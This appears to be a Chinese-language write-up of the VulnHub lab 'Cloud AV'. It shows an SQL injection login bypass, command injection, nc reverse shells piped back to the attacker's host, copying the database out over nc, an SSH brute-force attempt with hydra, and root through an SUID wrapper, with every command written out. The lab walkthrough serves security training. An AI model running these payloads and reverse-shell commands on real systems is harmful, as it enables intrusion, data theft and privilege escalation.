Week2

---



>**Name:** BoredHackerBlog: Cloud AV
>
>**Date release:** 29 Mar 2020
>
>**Author**: [BoredHackerBlog](https://www.vulnhub.com/author/boredhackerblog,683/)
>
>**Series**: [BoredHackerBlog](https://www.vulnhub.com/series/boredhackerblog,295/)
>
>**Download：**https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova
>
>**Description:**
>
>Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.
>
>Currently, it's in beta mode. You've been asked to test the setup and find vulnerabilities and escalate privs.
>
>**Difficulty:** Easy
>
>**Tasks involved:**
>
>- port scanning
>- webapp attacks
>- sql injection
>- command injection
>- brute forcing
>- code analysis
>
>**Virtual Machine:**
>
>- Format: Virtual Machine (Virtualbox OVA)
>- Operating System: Linux
>
>**Networking:**
>
>- DHCP Service: Enabled
>- IP Address Automatically assign
>
>This works better with VirtualBox rather than VMware.
>
>

## 一、信息收集

### 1.主机发现

```
ifconfig
```

![image-20211009095714305](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009095714305.png)

kali的IP为10.0.2.4

对10.0.2.0/24网段内的IP发送包进行探测发现![image-20211009095857623](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009095857623.png)

10.0.2.7**返回数据**，说明**存活**

### 2.端口扫描

```
sudo nmap -p- 10.0.2.7
```

![image-20211009101228440](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009101228440.png)

结果显示目标靶机**开放了22,8080端口**

### 3.端口服务扫描发现

```
sudo nmap -p22,8080 -sV 10.0.2.7
```

![image-20211009101354083](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009101354083.png)

目标系统为Ubuntu 且开放了22端口为**SSH服务**

8080端口的Werkzeug是基于Python2.7环境

补充：Werkzeug是一个WSGI工具包，Werkzeug可以作为一个 Web 框架的底层库，因为它封装好了很多 Web 框架的东西，例如 Request，Response 等等。如 Flask 框架就是以Werkzeug 为基础开发的。

## 二、漏洞发现与利用

### 1.访问页面

```
访问：http://10.0.10.7:8080
```

![image-20211009102035206](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009102035206.png)

页面如图为“云防病毒平台”，并提示需提交邀请码才能登录使用

那么如何突破这个页面？

### 2.测试SQL注入/爆破

尝试在页面文本框内**提交信息（特殊符号）**来服务端后端有没有对用户提交的**敏感字符**（不同语言环境下存在不同作用/意义的字符）进行过滤，若未过滤则有可能**发生报错**或会**返回错误信息**。

配置浏览器代理，使用BurpSuite对**符号**进行检测

![image-20211009103133428](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009103133428.png)

![image-20211009104716945](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104716945.png)

![image-20211009104651517](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104651517.png)

![image-20211009104834953](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104834953.png)

对页面进行测试后，**通过长度判断**，发现输入双引号(")可能产生了闭合，改变原语句执行语义，导致报错，报错页面如下图，**判断存在注入漏洞**

![image-20211009105012567](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105012567.png)

发现报错页面存在**疑似查询语句**

'select * from code where password="' + password + '"'

省去单引号

select * from code where password=" + password + "

尝试通过此语句构造payload

![image-20211009105106411](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105106411.png)

输入**1" or 1=1--+**提交后成功利用注入漏洞跨过了“invite code”验证，进入“云防病毒平台”页面

![image-20211009105148438](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105148438.png)

### 3.命令注入

可以发现这个页面的所显示的信息是ls -l命令执行的结果，在结合页面下的"File Name"文本框 和"Scan!"提交按钮，可以联想到页面背后的功能实现过程大概是一个“病毒攻击/平台”对文件扫描的功能，代码逻辑可能类似如下

```
xxxScanner 文件名
```

那么是否可以产生使用**管道符（|）**连接执行其他命令呢？下面进行尝试

```
hello | ls
```

![image-20211009142912228](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009142912228.png)

```
hello | id
```

![image-20211009142744487](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009142744487.png)

在等待服务端响应后，确实执行了ls和id，并在页面返回了相应的结果，即**存在命令注入漏洞**，那么是否可以反弹shell？

思路1：结合先前扫描结果，可以得到目标系统的语言环境是Python2.7.15，故可以利用Python反弹shell

思路2：利用nc反弹shell

(为了学习更多的攻击方法，选用思路2)

### 4.使用nc建立连接

确认目标系统**是否存在nc**命令

```
hello | which nc
```

![image-20211009143025187](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143025187.png)

补充：**| 表示管道符，上一条命令的输出，作为下一条命令参数**

目标系统**存在nc**命令，可正常进行后续操作

在Kali端：

```
ip a
```

![image-20211009143140893](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143140893.png)

确认Kali地址为10.0.2.4

nc监听端口4444

```
nc -nvlp 4444
```

![image-20211009143219519](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143219519.png)

在浏览器端：

使用nc反弹连接kali端的监听，在实验-e参数执行一个shell终端

```
hello | nc 10.0.2.4 4444 -e /bin/sh
```

![image-20211009143635524](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143635524.png)

执行后，并没有监听端口成功连接，怀疑该系统的系统版本下的nc**不支持-e参数**，所以这里我们先去除-e参数，尝试连接

```
hello | nc 10.0.2.4 4444 
```

![image-20211011150457393](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211011150457393.png)

成功建立连接，尝试输入命令

```
ls
```

```
id
```

![image-20211009145019507](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145019507.png)

结果发现不能执行来返回结果

故**采用多个**管道符（|），此法暂且称为“**nc管道符串联**”

在Kali上同时监听5555和6666端口：

```
nc -nvlp 5555
```

```
nc -nvlp 6666
```

![image-20211009145202343](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145202343.png)

在浏览器端 采用“nc管道符串联”：

```
hello | nc 10.0.2.4 5555 | /bin/bash | nc 10.0.2.4 6666 
```

![image-20211009145552070](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145552070.png)

kali端显示两个端口都成功连接

### 5.信息收集/ssh爆破

尝试在5555端口监听窗口输入命令，发现执行结果会在6666端口监听窗口显示，成功

![image-20211009145754300](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145754300.png)

登录到目标系统后，查看文件

```
ls -l
```

![image-20211009151033812](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151033812.png)

查看app.py

```
cat app.py
```

![image-20211009151112767](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151112767.png)

>from flask import Flask, render_template, request, session
>import sqlite3
>import subprocess
>import os
>
>conn = sqlite3.connect('database.sql',check_same_thread = False)
>c = conn.cursor()
>
>app = Flask(__name__)
>
>@app.route('/')
>def index():
>    return render_template('index.html')
>
>@app.route('/login', methods=['POST'])
>def login():
>    password = request.form['password']
>    if len(c.execute('select * from code where password="' + password + '"').fetchall()) > 0:
>        session['logged_in'] = True
>        return 'Redirecting to /scan. <meta http-equiv="refresh" content="0; url=/scan" />'
>    else:
>        return "WRONG INFORMATION"
>
>@app.route('/scan')
>def shop():
>    if session.get('logged_in'):
>        filelist = subprocess.Popen("ls -l /home/scanner/cloudav_app/samples", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()
>        return render_template('scan.html',filelist=filelist)
>    else:
>        return '<meta http-equiv="refresh" content="0; url=/" />'
>
>@app.route('/output', methods=['POST'])
>def output():
>    if session.get('logged_in'):
>        filename = request.form['filename']
>        scan_results = subprocess.Popen("clamscan "+filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()
>        return "<pre>" + scan_results + "</pre>"
>    else:
>        return '<meta http-equiv="refresh" content="0; url=/" />'
>
>if __name__ == "__main__":
>    app.secret_key = os.urandom(12)
>    app.run(host='0.0.0.0',port=8080, debug=True)
>
>

app.py中并没有可以直接有关提权的信息

查看database.sql

```
file database.sql
```

![image-20211009151631066](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151631066.png)

发现数据库版本信息SQLite 3.x，再结合之前sql注入时的页面返回信息

![image-20211009152025908](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152025908.png)

版本信息一致，猜测是Web应用程序服务端的数据库，有可能有隐私数据，所以就有必要查看

```
sqlite
```

尝试执行发现没有相关指令

![image-20211009151902078](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151902078.png)

即**服务端无法解析**sqlite文件，那是否可以将下载到kali本机上，使用kali本机上sqlite的执行环节来查看文件database.sql

在Kali端新窗口开启nc监听7777端口，将接收到的所有**连接请求都转发到**db.sql文件

```
nc -nvlp 7777 > db.sql
```

![image-20211009152136352](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152136352.png)

在监听5555端口的窗口内，连接10.0.2.4（kali）的7777端口**再通过重定向**将database.sql传输到nc通道内

```
nc 10.0.2.4 7777 < database.sql
```

![image-20211009152503151](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152503151.png)

database.sql文件不大，很快传输完Ctrl+C结束

![image-20211009152617144](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152617144.png)

```
ls
```

![image-20211009152646495](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152646495.png)

使用kali的sqlite3环境下查看db.sql

```
sqlite3
```

```
.open db.sql
```

```
.database
```

```
.dump
```

![image-20211009152831159](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152831159.png)

显示只有一个字段password,下方的INSERT语句向数据库添加了几个密码，那是否可以登录目标系统？回想发现阶段目标系统上开启ssh服务，所以进行尝试，现在寻找目标系统上的用户名

```
cat /etc/passwd
```

![image-20211009153106205](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153106205.png)

passwd文件中数据很多，需要做筛选过滤

筛选可以用**shell权限**登录系统的账号

```
cat /etc/passwd | grep /bin/bash
```

![image-20211009153238876](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153238876.png)

将用户名和密码都分别生成字典 准备进行爆破

```
vi user.txt
```

![image-20211009153516608](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153516608.png)

![image-20211009153446916](Week2.assets/image-20211009153446916.png)

```
vi pass.txt
```

![image-20211009153702323](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153702323.png)

![image-20211009153648892](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153648892.png)

使用Hydra爆破

```
hydra -L user.txt -P pass.txt ssh://10.0.2.7
```

![image-20211009154535990](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009154535990.png)

破解完成，失望，没有正确结果，这种攻击失败了，尝试别的攻击手段

### 6.SUID提权

回到目标机目录下，尝试查看目录下别的文件

```
ls
```

```
ls -l 
```

```
ls samples
```

发现这些文件就是Web界面那些可以进行防病毒扫描的文件

![image-20211009160341754](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009160341754.png)

暂时没有发现有帮助的信息

```
ls templates
```

![image-20211009160512163](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009160512163.png)

看到template下有两个**Web开发页面模板文件** index.html scan.html，但也没有有帮助的信息

查看查看的目录，确认现在所在目录

```
pwd
```

![image-20211009164418370](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009164418370.png)

去上一级目录，/home/scanner

```
cd .. 
```

```
ls
```

```
ls -la     #查看隐藏文件
```

```
ls- l
```

在隐藏文件中并未发现有直接帮助的文件，但发现了.c文件

![image-20211009165417380](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165417380.png)

update_cloudav.c可能就是cloudav.app程序的C语言源代码，且可以看到这个程序的权限是**可执行的**，s也代表有suid权限位，且属主是root账号，当执行该程序时会**默认继承该程序属主的权限**

设想：如果可以执行这个update_cloudav.c，是否可以通过某种命令注入的方法，**利用suid权限**带来的root权限来**执行某些系统命令来反弹shell**，来**完成提权**？

```
cat update_cloudav.c
```

>#include <stdio.h>
>
>int main(int argc, char *argv[])
>{
>char *freshclam="/usr/bin/freshclam";
>
>if (argc < 2){
>printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
>return 1;
>}
>
>char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
>sprintf(command, "%s %s", freshclam, argv[1]);
>setgid(0);
>setuid(0);
>system(command);
>return 0;
>
>}

包含了一些**头文件**，定义了一些**变量**，变量指向了操作系统中的文件freshclam，freshclam是给开源杀毒软件cloudav的病毒库升级的软件。这个程序**定义了一个执行参数**，如果程序在执行过程中**不包含**这个参数的话就会**显示信息**，要求提交一个命令行的参数，这样freshclam这个程序才能正常执行，完成病毒库的更新。如果正确使用参数，那么就会正常的运行cloudav，执行病毒库的更新。

总结一下：当我们**执行update_cloudav.c时**，会**调用**了cloudav.app的**病毒更新程序freshclam**，但在执行过程中**要求要有运行参数。**

先测试一个参数a

```
./update_cloudav a
```

![image-20211009165635210](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165635210.png)

出现日志文件**报错**，但是不确定是否会对执行有影响，继续尝试

利用管道符串联

在kali端: 

```
nc -nvlp 7777 
```

```
nc -nvlp 8888
```

![image-20211009165823593](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165823593.png)

在控制目标机端：

```
./update_cloudav "a | nc 10.0.2.4 7777 | /bin/bash | nc 10.0.2.4 8888"
```

**双引号作用：让./upadte_cloudav程序在执行的时候，认为双引号内的都是参数，从而继承这个程序它的suid位的权限**

```
id
```

![image-20211009165854532](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165854532.png)

成功拿到目标系统root权限！

